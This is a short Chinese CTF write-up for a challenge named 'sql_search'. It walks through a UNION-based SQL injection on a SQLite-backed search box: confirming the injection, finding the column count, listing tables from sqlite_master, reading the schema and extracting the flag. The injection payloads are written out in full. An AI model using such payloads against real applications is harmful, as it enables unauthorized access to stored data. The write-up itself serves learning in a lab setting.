---
title: sql_search
date: 2026-04-07 12:00:00
tags:
  - 题解
  - SQL注入
---

`题目给了个搜索框`

``

`输入' or '1'='1发现输出了所有可搜索内容，证明存在sql注入`

``

`用' union select 1,2,3--确定列数`

``

测试发现用SQLite数据库的命令发现可以被执行，用' union select 1,group_concat(tbl_name),3 from sqlite_master where type='table'--获取表名发现flaggggggggggg


![sql_search_cd7212bb](/images/writeups/sql_search_cd7212bb.png)


用' union select 1,sql,3 from sqlite_master where tbl_name='flaggggggggggg'--查询得到flag列


![sql_search_bb9855ca](/images/writeups/sql_search_bb9855ca.png)


用' union select 1,flag,3 from flaggggggggggg--得到flag


![sql_search_75dc43ba](/images/writeups/sql_search_75dc43ba.png)
